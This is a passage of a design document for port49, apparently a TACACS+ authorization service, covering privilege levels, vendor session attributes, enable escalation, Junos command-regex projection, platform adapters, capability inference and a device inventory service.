#### Deliberately not specified here

**Sink implementations.** Beyond the stdout default, a sink is an integration, not a design
decision: syslog, an HTTP endpoint, a message bus. The envelope is the contract.

**WATCHDOG semantics per platform.** A WATCHDOG carrying no arguments is a keepalive; one
carrying arguments is an update. Which platforms send them, and how often, is lab register
entry **L5**, and how late START and STOP arrive is **L6**.

---

## 6. Privilege levels and session attributes

### What a privilege level is

**Privilege decides what the device will offer. The role decides what port49 will let you
run. The effective permission set is the intersection, and the role is always a subset.**

A privilege level is the session's local access level on the device. It is not an
independent axis alongside command authorization, and it is also the policy that applies
when port49 is unreachable.

```
login  →  broker returns  priv-lvl=15, shell:roles*network-admin
              │
              ├─ gate 1: the DEVICE decides what this session can reach.
              │          priv-lvl governs what is present in the CLI at all;
              │          any device-local role carries its own permit/deny set.
              │
              └─ gate 2: for commands the device submits, port49 rules decide.
```

Command rules can only **narrow** what the level offered; they can never widen it. Returning
`priv-lvl=1` means the device will not offer `show running-config`, will never submit an
authorization request for it, and a rule permitting it is dead. Conversely, a backup account
needs `privilege: admin` so the command is *reachable*, while `permit: show **` is what
confines it once it is.

**The device-local role is not vestigial.** It governs two situations that port49 does not:

- **When port49 is unreachable.** Under `aaa authorization commands … group tacacs+ local`,
  the device falls back to local authorization, and the role assigned at login is what
  remains. This is the "active login" column of the design document's failure matrix — the
  device role *is* the degraded-mode policy.
- **Commands the device never submits.** With `aaa authorization commands 15` and no
  `commands 1`, everything below that tier is governed by the device role alone, always.

The device-local role SHOULD therefore be chosen as a sane approximation of the port49
role, not as a formality. Two CI checks make the relationship visible (§12).

### Abstract levels

Levels are an **ordered enum**. `readonly`, `operator`, and `admin` ship built in, are
reserved, and cannot be renamed or removed — that guarantees every shipped platform file
keeps working regardless of what an operator declares. Unused levels cost nothing.

Declaring `privilege_levels` **replaces the default ordering**, because order is what the
max-join uses:

```yaml
privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: senior_operator,   parent: operator}
  - {name: admin}
```

`parent:` is the escape hatch that makes custom levels practical. A new level would
otherwise need a mapping for every platform in the fleet; `parent: operator` says *render as
`operator` on any platform that does not define this level explicitly*, resolved
transitively up the chain.

This also turns an existing wart into declared behavior. NX-OS is role-native with two
built-in roles, so `readonly` and `operator` render identically there — with `parent:` that
is visible and intentional rather than a surprise. Usually it is exactly right:
`read_only_limited` differs from `readonly` in *which commands port49 permits*, not in what
the device needs to be told. Platforms may still override where the distinction is real.
On a session-only platform that distinction has to reach the device anyway, because nothing
asks port49 per command; §8's projection carries it, and picks its rendering model per
grant from exactly this difference between a role's permits and its level's capability.

A level with no mapping and no resolvable `parent:` chain, on a platform present in
inventory, is a **policy load error**.

**Reordering the list is a breaking change.** Inserting a level mid-list changes every
max-join that crosses it, and the effective-permission diff MUST report that as a privilege
change rather than a cosmetic one.

The operator writes `privilege: readonly` on a role. Where multiple roles are granted, the
effective level is the **max** over the enum. A role with no `privilege` contributes
nothing.

### Three role shapes

Privilege is declared on the **role**, never overridden on a grant. An override has nowhere
to record *why* it exists, and — because the level also determines the device-local role
that applies when port49 is unreachable — burying one in a grant row silently changes
degraded-mode behavior. A named role can carry a `reason:`.

Composition, not variants, prevents role explosion. A role may carry only a privilege:

```yaml
roles:
  - name: read_only
    privilege: readonly
    permit: [show **]

  - name: elevated_session
    privilege: admin
    reason: "device exposes show running-config only at level 15"
    # no permit/deny — contributes a level and nothing else

grants:
  - {subject: svc_oxidized, scope: all_devices, roles: [read_only, elevated_session]}
```

Effective level is `max(readonly, admin)`; commands stay `show **`. One named elevation is
granted where needed rather than forking `read_only_admin`, `read_only_operator`, and so on.

| Shape | Carries | Example |
|---|---|---|
| commands + privilege | both | `read_only`, `bgp_operator` |
| commands only | contributes nothing to the max | `no_disruptive`, `cve_2026_xxxx` |
| privilege only | no rules | `elevated_session` |

### Attributes are transported, not understood

Vendor attributes are unbounded — F5 partitions, Palo Alto access domains, Fortinet
profiles, Nokia home directories, and whatever ships next quarter. port49 MUST NOT require
knowledge of any of them.

RFC 8907 already defines the wire format: `attribute=value` is mandatory,
`attribute*value` is optional. Every vendor attribute ever invented fits that. port49's
obligation is therefore to **transport faithfully and validate structurally**, never to
interpret. Unboundedness stops being a problem provided the schema accepts anything and
defaults to the non-breaking choice.

### Where attributes are declared

**Platform file**, for anything tied to a level. Operators may extend a shipped platform or
define their own in the policy repository, with no upstream change required:

```yaml
platforms:
  f5_bigip:
    authorizes: [session]
    privilege:
      readonly: ["F5-LTM-User-Role*700", "F5-LTM-User-Partition*all",
                 "F5-LTM-User-Console*1"]
      admin:    ["F5-LTM-User-Role*0",   "F5-LTM-User-Partition*all",
                 "F5-LTM-User-Console*1"]
```

Most vendor attributes live here, because most of them *are* the level expression.

**Role and grant**, keyed by platform, for anything that is not a level:

```yaml
roles:
  - name: read_only
    privilege: readonly
    permit: [show **]
    attributes:
      all: ["idletime*30", "timeout*480"]

grants:
  - subject: team_a
    scope: f5_fleet
    roles: [read_only]
    attributes:
      f5_bigip: ["F5-LTM-User-Partition*prod"]
```

Layering is **platform → role → grant**, most specific wins on a duplicate attribute name,
and CI MUST report the shadowing so an override never happens silently.

Values support a **fixed** substitution vocabulary — `{username}`, `{principal}`,
`{device}`, `{privilege}` — and nothing more. `home-directory*/home/{username}` is the
motivating case; a general template language would be a footgun.

### Validation without semantics

port49 cannot check what an attribute means. It MUST check everything else:

- Exactly one `=` or `*` separator, non-empty attribute name, no duplicate names.
- **Length.** The RFC's argument length field is one byte, so **255 bytes per attribute**,
  and `arg_cnt` is likewise one byte. A generated `deny-commands` regex (§8) will exceed
  this before anything else does. The encoder cannot emit an over-length argument at all, so
  the failure is never truncation on the device (L11); it is a refusal at policy load, which
  is where this MUST be caught.
- Mandatory versus optional, with a warning on any mandatory attribute not recognized.

**Unknown attributes default to optional (`*`).** A mandatory attribute a device cannot
parse causes it to reject the entire session, breaking every login on that platform.
Defaulting to optional means adding a custom attribute cannot take down a fleet; declaring
one mandatory is then a deliberate, reviewable act.

**Not every level is natively representable.** NX-OS is role-native with two built-in roles,
so `readonly` and `operator` render identically and the distinction is carried entirely by
command authorization. That is acceptable, but it MUST be visible in the platform file
rather than silently surprising.

**Platforms that are not `priv-lvl`-native** (Junos maps to `local-user-name`) MUST declare
a mapping for every level. A missing mapping is a **policy load error in CI**, not a broken
login at 3am.

**Exact attribute spellings are lab-verified, not asserted.** The shipped adapters use bare
`priv-lvl` for the TACACS+ shell-service reply and `shell:roles` for EOS and NX-OS roles.
Those spellings — and every other attribute name in a shipped platform file — MUST be
confirmed against a real image in the containerlab matrix before that adapter is marked
`VERIFIED` (§8). A wrong attribute name fails silently as an ignored optional attribute, or
loudly as a rejected session if declared mandatory, and neither outcome should be discovered
in production.

### Diagnosing an unfamiliar vendor

Because port49 cannot validate semantics, it MUST make the outcome inspectable:

```
$ port49 explain --subject team_a --device f5-lb-01 --show-attributes
session attributes that would be returned:
  F5-LTM-User-Role*0            (optional)  ← platform f5_bigip, level admin
  F5-LTM-User-Partition*prod    (optional)  ← grant override, shadows platform "all"
  F5-LTM-User-Console*1         (optional)  ← platform f5_bigip, level admin
  idletime*30                   (optional)  ← role read_only
```

And when a device rejects session authorization immediately after attributes are returned,
port49 MUST name the likely cause rather than leaving it to be guessed: *"f5-lb-01 rejected
session authorization; 1 mandatory attribute was sent (`X=Y`) — an unsupported mandatory
attribute causes rejection."*

---

## 7. Escalation (`enable`)

Enable is a real workflow and must be supported, not designed around.

### What the wire looks like

Typing `enable` produces a **new authentication** — usually on a new TCP connection — with
`authen_service=ENABLE`, `priv_lvl` set to the requested level, `authen_type=ASCII` on
essentially every platform, and a username that is frequently `$enab15$` rather than the
principal.

Three consequences:

1. No token exists for it — the operator is already logged in and typing interactively.
2. On a `$enab{level}$` platform the username does not identify the principal. This was the
   whole reason login context was keyed on `(nas, port)`, with the username as a verified
   attribute rather than part of the key. **That reason lost to measurement on 2026-09-20**
   (§13, decision 15): `port` is not the same value at authentication and at authorization on
   any platform in the lab except IOS-XE, so the key it bought did not work, while the platform
   behavior it was serving has not been observed on any device at all. On vEOS **and on IOS-XE**,
   measured, the enable START carries the operator's **own** username with `service=enable` — not
   `$enab15$` — so the key costs both platforms nothing (`tests/lab/results/L3-arista_eos.md`,
   `L3-cisco_iosxe.md`, measured 2026-09-20). Login context is now keyed on `(nas, username)`,
   and the `$enab{level}$` case is served by a `(nas, rem_addr)` secondary index that MUST
   refuse rather than guess when it resolves to more than one context. That path stays
   **provisional**, now because no device in this lab has been measured sending that username
   form rather than because the likely platform was untested.
3. The enable password was never a second authentication. It is a shared device secret or a
   per-user password in the TACACS database. With certificate identity, whoever holds that
   TTY has already proven who they are — so enable is an *authorization* decision.

### Configuration

```yaml
subjects:
  - name: netops_admins
    group: "CN=netops-admins,OU=Groups,DC=example,DC=com"
    enable: token          # none | auto | token   (default: none)

grants:
  - {subject: netops_admins, scope: all_devices, roles: [network_admin],
     max_privilege: admin}
```

The **ceiling** (`max_privilege`) is an authorization fact and lives on the grant, resolved
as a max across matching grants. The **mechanism** (`enable`) is a property of the consumer
and lives on the subject, so two grants can never disagree about it.

**Which field, when.** Three settings touch privilege and they answer different questions:

| Field | On | Answers |
|---|---|---|
| `privilege` | role | what level the session *lands at* on login |
| `max_privilege` | grant | how far `enable` may *raise* it afterwards |
| `enable` | subject | *how* the raise is authenticated: refused, automatic, or by token |

If the role's `privilege` already reaches what the subject needs, leave `max_privilege` and
`enable` unset — the session lands there and nothing needs escalating. Set `max_privilege`
only when a session should start low and be raised on demand, and then `enable` says how.
Both tokens of a mint pair carry a `kind`, and the daemon checks it against
`authen_service`: a login token at the `enable` prompt, or the reverse, is refused with
`token_kind_mismatch` so the `redeem` and `escalate` records can never disagree with the wire.

| Mechanism | Behavior | Fits |
|---|---|---|
| `none` | Enable is refused. The login-time privilege is all there is. | Read-only pollers whose granted level already suffices. |
| `auto` | Daemon resolves `(nas, username)` → login context, checks the ceiling, PASSes. Any password accepted. **Available only where `enable_username: principal`** (§5.6), which is what makes the wire username the key. | Tools that insist on typing `enable` where plumbing a second secret is awkward. |
| `token` | A second minted token, supplied at the prompt. | Anything needing a discrete, attributable escalation record. |

**How an enable token is found.** Tokens are stored under `(nas, username)`. Where the enable
START carries the principal's own username — measured on vEOS, and required wherever
`enable_username: principal` — that key is read straight off the wire and the candidate set is
fetched under it, filtered to `kind: enable`. On a `$enab{level}$` platform the START carries
`$enab15$` instead, and the daemon resolves `(nas, rem_addr)` → login context → the bound
`username`, refusing rather than guessing if more than one context answers. Two consequences
follow and both are correct: an enable token is unredeemable where port49 authenticated no
session from that address, because there is no context to resolve the username from; and an
enable token minted for Alice cannot be redeemed against Bob's context, because the lookup key
comes from the context rather than the wire. The `$enab{level}$` half is provisional on L3.

### Automation

The mint returns a **pair**, because every relevant tool already has a second credential
field — `enable:` in Oxidized, `secret=` in Netmiko:

```python
tok  = port49.token(device)      # {"login": "p49_7K2Q…", "enable": "p49_R4XN…"}
conn = ConnectHandler(device_type="cisco_nxos", host=device,
                      username="svc-config-backup",
                      password=tok.login, secret=tok.enable)
```

Both are device-bound, single-use, and share a TTL. No tool changes.

Worth noting that `enable: none` is often the honest answer for backup accounts: they type
`enable` because the account landed at privilege 1. Granting the read-only role at `admin`
privilege removes the escalation entirely.

After a successful escalation, login context records the new privilege level in place —
same `ctx_id`, same bindings. **This is the requirement on the escalate path, which plan 2
builds; plan 1 does not do it.** Plan 1's `redeem` treats an enable START as an ordinary
redemption, so it writes a fresh `ctx_id` over the login context — measured on vEOS
2026-09-20 (§5.6, teardown row 1; `tests/lab/results/L3-arista_eos.md`). The rules do not change: a role's permits and denies apply at
every level, and what escalation changes is which commands the device *offers* and therefore
submits. The recorded level feeds `privilege_exceeded` for a request above it. Accounting and
the `escalate` record attribute the event to the **real principal** even though the wire said
`$enab15$`.

---

## 8. Platform adapters

A platform adapter is a small declarative file. Adapters ship built in, are verified in the
containerlab matrix where an image exists, and are both overridable and contributable.

```yaml
platforms:
  arista_eos:
    supports: [session, commands, config_commands]
    privilege:
      readonly: ["priv-lvl=1",  "shell:roles*network-operator"]
      operator: ["priv-lvl=7"]
      admin:    ["priv-lvl=15", "shell:roles*network-admin"]
    entity_classes:
      management: ['^Management[0-9]+$']
      loopback:   ['^Loopback[0-9]+$']
      physical:   ['^Ethernet[0-9/.]+$', '^Port-Channel[0-9]+$']
    enable_username: principal
    expands_abbreviations: true
    pipe_token: "|"
    pipe_authorized: true
    port_pattern: '^vty[0-9]+$'
```

Most devices need far less. A time server or a BMC that does authentication plus one
attribute is complete in four lines:

```yaml
  meinberg_lantime:
    supports: [session]
    privilege:
      readonly: ["priv-lvl=1"]
      admin:    ["priv-lvl=15"]
```

### Fields

| Field | Purpose | Required |
|---|---|---|
| `privilege` | level → attributes at session authorization | always |
| `supports` | capability declaration (see §9) | always |
| `entity_classes` | named sets of device entity names, referenced as `@class` in rules | if rules use classes |
| `enable_username` | `principal`, or a template such as `$enab{level}$` | if enable is supported |
| `expands_abbreviations` | whether the device sends resolved command words | if `commands` |
| `pipe_token` / `pipe_authorized` | modifier separator; whether it reaches us | if `commands` |
| `command_projection` | how rules render for session-only platforms (below) | if `session`-only |
| `bits` / `bit_delivery` | each permission bit's reach in rule form, and whether bits travel as `user-permissions` or a `local-user-name` template (below) | if `session`-only |
| `redact` | patterns whose argument values are removed before an accounting record is emitted (§5.8) | if the platform sends command accounting — session-only platforms included |
| `session_services` | the authorization `service` values this platform's sessions arrive with; a **list**, because the name is device-configurable on Junos | defaults per platform |
| `port_pattern` | expected `port` shape, used only for drift detection | optional |

### `session_services`

The one adapter field plan 1 reads. It is the list of authorization `service` values a
session on this platform may arrive with, and a request carrying anything else is denied
`service_unsupported` (§5.3).

```yaml
platforms:
  juniper_junos:
    session_services: ["junos-exec", "junos-exec-fw"]
```

Built-in: `[shell]` for `arista_eos`, `cisco_nxos` and `cisco_iosxe`, `[junos-exec]` for
`juniper_junos` (§15, L10). A platform with no adapter falls back to `[shell]`. It is a list
and it is settable because Junos renames it on the device — `set system tacplus-options
service-name junos-exec-fw` — so `junos-exec` is a default rather than a constant, and a
fleet that has renamed it sets the list rather than waiting for a new built-in. Setting the
list **replaces** the built-in; a fleet that renames some devices and not others lists both
names.

A name under `platforms:` that port49 ships no adapter for is refused at load, so
`platforms: {junos: …}` is a startup error naming the platforms it could have meant rather
than a block that silently applies to no device. That is the opposite of the *device* case
above only in appearance: an unmodeled device still logs in, on the fallback; a misspelled
configuration key never becomes a default nobody chose.

Declaring a service here does not grant anything. See the rule in §5.2: the `service` value
never selects policy — scope membership from the inventory does.

### Entity classes

Entity classes **classify, they do not canonicalize**. port49 never needs to know that
`ge-0/0/1` and `Ethernet1/1` denote the same kind of thing — a general cross-vendor
canonical naming scheme is a substantial project in its own right and is not required here.
Each platform states only which of *its* names belong to which class:

```yaml
  cisco_nxos:
    entity_classes:
      management: ['^mgmt[0-9]+$']
  juniper_junos:
    entity_classes:
      management: ['^(fxp0|em0)$']
```

One rule — `deny: interface @management` — then means the same thing everywhere, and a
platform that fails to define a referenced class produces a load error rather than a silent
non-match.

The same construct extends naturally to VRFs, VLAN ranges, and protocol instances. A more
capable variant sources classes from **inventory** rather than regex — `@core_uplinks`
defined by interface tags in the source of truth, so the class reflects the network rather
than a naming convention. That is deliberately deferred: interface-level inventory is a far
larger dataset (10,000 devices times tens of ports) than the device-level sync in §10.

### Projection for session-only platforms

Platforms that do not authorize per command receive port49's decision **projected** into
their native model. Junos is the motivating case: `allow-commands` and `deny-commands` are
returned as attributes at session authorization, generated from the role's rules rather than
looked up from a static table.

```yaml
  juniper_junos:
    supports: [session]
    command_projection: junos_regex
```

A trie of literal prefixes converts to an alternation mechanically —
`[start, **]` and `[file, **]` become `(start.*|file.*)` — and Junos uses extended regex, so
the absence of lookahead is no constraint that our grammar does not already accept.

#### Measured target behavior

The following was established by lab testing rather than inferred from documentation, which
does not specify precedence, repetition, or length behavior.

**Class-resident and wire-delivered rules flatten into one merged set, and a matching permit
regex beats a matching deny regex — regardless of specificity and regardless of origin.**

| Deny | Allow | Origin | Result |
|---|---|---|---|
| `show chassis cluster status` | `show chassis .*` | both wire | all `show chassis` permitted |
| `show chassis .*` | `show chassis cluster status` | both wire | only the allowed command permitted |
| `show chassis cluster status` (wire) | `show chassis .*` (class) | split | all permitted |
| `show chassis .*` (class) | `show chassis cluster status` (wire) | split | only the allowed command permitted |

**Broad capability comes from permission bits, not from a permit regex.** In the lab the bits
sat in the login class; Junos also accepts them per session as the `user-permissions`
attribute (L12). Either way, with no permit regex covering a command a deny applies cleanly
against the bit baseline. Modelling the baseline as `allow-commands "show .*"` would instead
defeat every deny beneath it.

**Two delivery channels, both carrying either attribute:**

| | Ceiling | Provisioning | Changes |
|---|---|---|---|
| **Wire** (TACACS attributes) | 240 bytes, **one argument per name** | none | fully dynamic |
| **Class** (device config) | none — verified enforced past 255 with no truncation | deploy; compliance is the deployment's tooling | config push |

**Repeated attribute names collapse to the first, silently.** A policy needing two instances
of one name arrives incomplete with no signal.

**`allow-commands` and `allow-commands-regexps` are mutually exclusive.** The commit checker
rejects the combination in config; over the wire the device accepts it and then locks the user
out of everything.

**The device validates configuration but not wire attributes.** There is no device-side
backstop for anything port49 sends, which makes the generator the only validation layer that
exists — and makes the commit checker a free specification: any combination port49 might emit
should be commit-tested first, and anything the CLI refuses must never reach the wire.

#### The projection model

Junos has two layers of authorization and port49 uses both, in that order. **Permission
bits** are the coarse layer: `view`, `view-configuration`, `configure`, `all`, and the rest,
each reaching a subsystem rather than a command. **Regexes** are the fine layer, and the
measured precedence (L11) is that a matching `allow-commands` beats a matching
`deny-commands` from any origin. The projection is computed per **effective rule set** — the
composition of every role in the grant (§5.4), per grant on a session-only device — never
per role, since two roles that each render can compose into a shape that does not.

**Bits first.** The generator chooses the smallest bit set that covers the grant's permits,
never exceeding the level's ceiling. A deny that aligns with a bit boundary drops the bit
instead of emitting a regex: a readonly role that denies `show configuration **` sends
`view` without `view-configuration`, and nothing on the wire has to be beaten by anything.
The realistic readonly is exactly that — `view view-configuration` plus a short
`deny-commands` for the carve-outs the bits cannot separate — and it is the shape this
generator produces by default.

Bits reach the device one of two ways, both in use in real fleets and selected per adapter:

| `bit_delivery` | What is sent | Device provisioning |
|---|---|---|
| `user_permissions` | `user-permissions=<bits>` per session, chosen per grant | one template user (`remote` or named) whose class carries no bits of its own |
| `local_user_name` | `local-user-name=<template>`, one template per level, bits in its class | one class per level, rendered by `port49 platform export` |

`user_permissions` is the default: zero per-level provisioning, and the bit set follows the
grant rather than the level. `local_user_name` is for deployments that already provision
classes and want the ceiling in device config where their compliance tooling can see it.

**Regexes for what bits cannot separate.** After the bits are chosen:

```
wire:    user-permissions   view view-configuration     ← or local-user-name=<template>
         deny-commands      <denies beneath a bit>      ← the carve-outs
         allow-commands     <permits that dominate a deny under §5.4>
```

A permit that would not dominate in port49 MUST NOT be emitted, because on the target it
would win anyway and silently void the deny. Permits the bits already cover emit nothing.
This is the **capability shape**, and it is the common case.

**Narrow shape.** A grant whose permits are narrower than every bit that would cover them —
`read_only_limited` (§6) with three show commands — cannot be expressed by bits at all, and
emitting nothing widens it to all of `view`. On a command-authorizing platform the daemon
enforces the difference per command; on Junos the projection is the whole enforcement. The
rendering is a `deny-commands .*` baseline plus one `allow-commands` alternation, under the
smallest bits that make the commands exist:

```
wire:    user-permissions   view
         deny-commands      .*
         allow-commands     (show version|show interfaces .*|show ip route .*)
```

The effective set is exactly the permits. Because the allow beats every deny, this shape
cannot carry a deny beneath a permit.

**Refused shape.** Permits narrower than the covering bits *and* a deny beneath one of them —
`permit: [show interfaces **], deny: [show interfaces terse]` — fits neither. Junos regex
has no lookahead, so "everything under X except Y" cannot be written as one allow. CI MUST
refuse the policy at load, naming the grant, the two rules, and the platform, rather than
rendering the nearest shape. Junos documents a second attribute family,
`allow-commands-regexps` / `deny-commands-regexps`, in which **deny takes precedence by
default** and which is mutually exclusive with the plain family on the wire. If that
precedence holds over TACACS+ (L12), the refused shape becomes expressible in that family
and the generator picks a family per grant; until it is measured, the shape is refused.

For the generator to choose bits and to tell "narrower than the bits" from "covered by
them", the adapter declares each bit's reach in rule form and each level's ceiling:

```yaml
  juniper_junos:
    supports: [session]
    command_projection: junos_regex
    bit_delivery: user_permissions
    bits:
      view:               [show **]
      view-configuration: [show configuration **]
      clear:              [clear **]
      configure:          [configure **, edit **, commit **, rollback **]
      all:                [**]
    privilege:
      readonly: [view, view-configuration]
      operator: [view, view-configuration, clear, network, reset, trace]
      admin:    [all]
```

`bits:` and `privilege:` are required for a session-only platform; `privilege:` is the
ceiling, in bits, and `port49 platform export` renders the reference class per level from
it under `local_user_name`. CI reports which shape each grant rendered under, the bit set it
chose, and any grant whose shape or bits changed between two policy versions, since that is
a change in what the wire says even when no rule changed.

Both shapes start on the wire. Moving denies into the class buys unbounded capacity at the
cost of a config push, so CI MUST report when a grant crosses that line rather than letting
it happen quietly — naming the grant, and emitting the class snippet that would carry the
overflow, so the workaround is in the same report as the warning.

This rendering rule is decision 22 and is **provisional on L12**. The SRX tests measured
class-resident bits with wire regexes; `user-permissions` over TACACS+ is in production use
but has no capture, and neither has the reach of each bit, the `.*` baseline on the wire, nor
the `-regexps` family's precedence. The plan's containerlab step closes L12 before the
generator is final.

#### Generator constraints

None of these are caught by the device. All MUST be enforced at policy load:

1. **One instance per attribute name.** Duplicates are silently discarded after the first.
2. **240 bytes for a wire attribute**, enforced in the encoder — the one-octet argument length
   makes it a protocol impossibility rather than a policy choice, so an over-length argument
   is never emitted at all.
3. **Never emit `allow-commands` together with `allow-commands-regexps`.**
4. **Never emit a permit broader than its intended grant.** An over-broad permit silently
   voids the entire deny baseline beneath it.
5. **Reject invalid or over-budget policy loudly at load time**, never silently at session
   time. A server that skips an attribute at session time produces a fail-open shape.

**Blast radius.** An invalid projection locks out every user authenticating against that
device simultaneously. Lockout is fail-closed, but deployments MUST have a break-glass path
independent of TACACS attributes — a local account or console access (design document §4).

#### Verification

`show cli authorization` is not available on all releases. Where it is absent, **`?`
completion substitutes**: denied commands are absent from completion rather than merely
rejected on execution, so the device exposes its computed effective set through it. That is
also how class-side enforcement past 255 bytes was confirmed.

**Differential testing is required, not optional.** Generate the attributes, apply them in
containerlab, and assert the device's effective set matches port49's own decisions across a
probe corpus covering every rule shape the generator can produce. Where equivalence cannot be
established for a shape, CI MUST refuse the policy rather than ship something unprovable.

**The class is device configuration, and port49 does not police device configuration.** On
every other platform the equivalent — `aaa authorization commands` present or absent — is
inferred from traffic (§9) and otherwise left to the deployment's configuration compliance
tooling. Junos is not an exception to that boundary merely because nothing arrives after login
to infer from. port49's obligations are three: warn at policy load when a role needs the class
(above); publish the reference class per privilege level through `port49 platform export`, so a
compliance tool has a known-good to check against; and have `explain` state that on a
session-only platform the effective set is *class ∩ wire*, with the class half outside port49.
No component logs into a device to verify it, and the `?` completion technique is a lab
instrument for the differential test, not a runtime one.

**Anchoring is a per-platform property.** Our rules match the full vector. A device treating
`start.*` as unanchored would also match `request start …`, diverging from our semantics.
That belongs in the adapter and is asserted in the lab, never assumed.

**Importing existing configuration.** Simple alternations of prefix patterns convert to
token rules mechanically; arbitrary regex does not. A migration tool MUST convert what it can
and **flag the remainder for human review rather than approximating**, because a
mistranslated deny is precisely the failure a migration must not introduce.

### User-editable, day one

Operators MUST be able to define and override platforms without an upstream change. A fleet
containing Supermicro BMCs, Meinberg time servers, and HPE gear cannot wait on releases —
that is the ticket-queue bottleneck the design exists to remove.

Built-ins ship embedded in the binary; user files live in the policy repository and merge
over them, per top-level key:

```yaml
# platforms/arista_eos.yaml — adds one class, inherits everything else
platforms:
  arista_eos:
    entity_classes:
      uplink: ['^Ethernet(49|50|51|52)$']
```

`replace: true` on a platform block discards the built-in and starts clean. `based_on:`
declares a variant, using the same vocabulary as `parent:` on privilege levels:

```yaml
  whitebox_nos:
    based_on: arista_eos
    entity_classes:
      management: ['^ma1$']
```

User files receive identical structural validation to shipped ones: required fields,
attribute syntax, the 255-byte limit, and entity-class patterns must compile under RE2.

### Knowing what is shipped

Embedded definitions must not be opaque.

**They are files.** Sources live at `platforms/*.yaml` in the repository — browsable and
diffable across tags without running anything.

**They are introspectable**, and honest about verification:

```
$ port49 platform list
PLATFORM           SOURCE     VERIFIED       SUPPORTS
arista_eos         built-in   containerlab   session,commands,config_commands
cisco_nxos         built-in   containerlab   session,commands,config_commands
juniper_junos      built-in   containerlab   session
f5_bigip           built-in   community      session
meinberg_lantime   local      —              session
```

A community-contributed adapter nobody has run against a real image MUST say so rather than
appearing identical to one verified on every commit. `platform show <name>` prints a
definition, `--effective` the merged result after overrides, and `platform export --all`
writes them to disk.

**Published documentation is generated from the embedded files** at release time, so it
cannot drift from the binary.

**And the platform set is pinned.** If `arista_eos.privilege.admin` gains an attribute in a
release, upgrading the binary silently changes what every EOS admin session receives — a
**binary upgrade becomes an unreviewed policy change**. Policy therefore pins a version:

```yaml
platform_set: 1.4.0
```

Upgrading the binary changes nothing about rendering. `port49 platform upgrade` moves the pin
and reports exactly what changes:

```
platform_set 1.4.0 → 1.5.0

  arista_eos.privilege.admin
    + shell:roles*network-admin        (was absent)
    affects 4,412 devices, 6 subjects

  juniper_junos.supports
    + config_commands                  ⚠ 2 roles have config rules
                                         that were previously dead
```

CI SHOULD also report override drift — an override that now matches the built-in and can be
removed, or a built-in change an override shadows — so local platform files do not rot
silently as upstream improves.

**`port49 platform export <name>`** emits a file suitable for an upstream pull request:
written for one fleet on day one, contributed once proven.

### Unknown platforms

An unknown **device** — one not in inventory — fails closed. That is an admission decision.

An unknown **platform** is different: the device is legitimately admitted, we simply lack a
dialect file. It receives a generic adapter (`priv-lvl` only, `supports: [session]`) and
raises an alarm. Someone will always rack something unmodeled, and that must not take down
their login.

---

## 9. Capability inference

`supports` conflates nothing — it states what a platform is *capable* of. What a given
device is *configured* to do is a separate, per-device fact, and it is the one that is
silently wrong in real fleets.

An IOS or EOS switch is capable of config-command authorization. Whether it performs it
depends on `aaa authorization config-commands` having been typed on that box. A device with
it disabled looks completely healthy while every `interface` and `router bgp` line goes
unauthorized and unaccounted.

**port49 MUST infer observed capability from traffic it already handles**, and MUST NOT ask
an operator to assert it:

| Observation | Conclusion |
|---|---|
| Received `service=shell` with empty `cmd` | performs session authorization |
| Received `cmd=<word>` requests | performs command authorization |
| Permitted `configure terminal`, then saw no authorization requests before the session's next exec command or its end | config-command authorization is probably disabled |

The third is evidence, not proof — an operator can enter config mode and immediately leave —
so it MUST be evaluated statistically over a window rather than per session.

**Reconciling accounting against authorization** generalizes the technique. Where command
accounting is enabled, a command appearing in an accounting record with no corresponding
authorization request proves the device decided it locally. The join runs only over tiers the
platform's `supports` says it authorizes: on a `supports: [session]` platform every command is
decided locally by design, and reporting each one would make the report noise on day one. The join is `ctx_id` plus the
normalized vector, over the single stream both events share (§5.7, §5.8) — which is why the
`<cr>` stripping and shape-preserving redaction in §5.8 are correctness requirements here and
not cosmetic:

```
⚠ UNAUTHORIZED TIER — leaf-04
    47 commands in accounting had no corresponding authorization request
    example: "show interfaces", "show version", "ping 10.0.0.1"
```

Every platform has a way to under-authorize silently, and each spells it differently — a
missing level on IOS (`aaa authorization commands 1`), a missing `config-commands` on NX-OS,
a level list instead of `all` on EOS. Reconciliation finds the gap without knowing which
spelling caused it, which is why it belongs here rather than in per-platform documentation.

This matters most in combination with privilege level. A session returned at `priv-lvl=2`
on a device configured only for `aaa authorization commands 15` submits **nothing** for
authorization — every command in that session is decided locally, and port49's rules, however
carefully written, are never consulted. The device looks entirely healthy throughout.

```
$ port49 devices capabilities
DEVICE      PLATFORM       ADMISSION    SUPPORTS                          OBSERVED
leaf-01     arista_eos     admitted     session,commands,config_commands  session,commands,config_commands
leaf-04     arista_eos     admitted     session,commands,config_commands  session,commands   ⚠ config-commands off
pdu-dc1-a   generic        admitted     session                           session
ntp-01      meinberg       admitted     session                           —                  ⚠ never seen
xr-edge-1   cisco_ios_xr   quarantined  session,commands                  —                  ✗ @management undefined for cisco_ios_xr (no_disruptive); bundle 2292
```

Two checks fall out, and both are needed:

- **CI**: a granted role carries command rules that the platform's `supports` cannot
  enforce. Caught at review time.
- **Runtime**: the platform is capable but the device is not configured. Caught by drift
  detection.

**What silence can and cannot mean.** Every conclusion here reads a *gap* between two streams,
and accounting is best-effort — so a gap can also mean records were lost in transit or dropped
from a full spool. Reconciliation MUST therefore be qualified by the accounting stream's own
health over the same window: spool drops, `ERROR` replies, and unattributed-record counts
(§5.8). A report that cannot distinguish "the device did not ask" from "we did not receive"
will eventually accuse a correctly configured device, and once that happens nobody reads the
report again.

> **Principle.** Never require an operator to assert something the system can observe.
> Anything declared by hand about device behavior will eventually be wrong, and it will be
> wrong silently.

---

## 10. Device inventory

TACACS+ carries no device identity — the daemon observes a source address and nothing more.
Every device attribute the engine depends on comes from an inventory, and so does the shared
secret each NAS uses.

### The inventory service

Source-of-truth interaction belongs in its own workload, `port49-inventory`. This is the
same rule the architecture applies one layer down: the daemon never talks to the directory,
and neither the broker nor the daemon talks to NetBox.

Three properties justify the separate component:

- **Connector faults cannot reach the authentication path.** Connectors are a contributable
  surface (below); running them out of process means a third-party connector that leaks
  memory or chokes on a large response takes down a syncer, not authentication.
- **Source-of-truth credentials live in exactly one workload.**
- **It is the component permitted to be a singleton.** One replica, no leader election, no
  high-availability story — because nothing depends on it being up. Placing the singleton
  where availability does not matter is a deliberate architectural choice.

```
GET  /v1/bundle                      full bundle; ETag for cheap no-op refresh
GET  /v1/bundle/version              current version, for polling
GET  /v1/bundle/diff?from=<ver>      for CI and `port49 inventory diff`
